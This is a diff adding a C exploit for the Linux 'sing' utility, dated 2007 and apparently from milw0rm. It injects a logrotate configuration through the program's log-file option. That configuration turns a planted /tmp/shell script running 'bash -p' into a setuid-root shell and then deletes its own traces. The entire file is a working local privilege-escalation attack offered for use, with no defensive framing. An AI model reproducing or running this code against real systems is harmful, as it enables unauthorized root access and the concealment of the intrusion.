@@ -1,0 +1,58 @@
+/*
+ sing file append exploit
+ by bannedit
+
+ 12/05/2007
+
+ The original reporter of this issue included an example session which
+ added an account to the machine.
+
+ The method for this exploit is slightly different and much more
+ quiet. Although it relies upon logrotate for help.
+
+ This could easily be modified to work with cron daemons which
+ are not too strict about the cron file format. However,
+ when I tested vixie cron it appears that there are
+ better checks for file format compilance these days.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define SING_PATH "/usr/bin/sing"
+
+char *file = "/etc/logrotate.d/sing";
+char *evilname = "\n/tmp/sing {\n    daily\n    size=0\n    firstaction\n        chown root /tmp/shell; chmod 4755 /tmp/shell; rm -f /etc/logrotate.d/sing; rm -f /tmp/sing*\n    endscript\n}\n\n\n";
+
+
+
+int main()
+{
+FILE *fp;
+int pid;
+
+        puts("sing file append exploit");
+        puts("------------------------");
+        puts("by bannedit");
+
+        if(fp = fopen("/tmp/shell", "w+"))
+        {
+           fputs("#!/bin/bash\n", fp);
+           fputs("/bin/bash -p", fp);
+           fclose(fp);
+           system("touch /tmp/sing; echo garbage >> /tmp/sing");
+        }
+        else
+        {
+           puts("error making shell file");
+           exit(-1);
+        }
+
+        sleep(5);
+        printf("done sleeping...\n");
+        execl(SING_PATH, evilname, "-Q", "-c", "1", "-L", file, "localhost", 0);
+        return 0;
+}
+
+// milw0rm.com [2007-12-06]
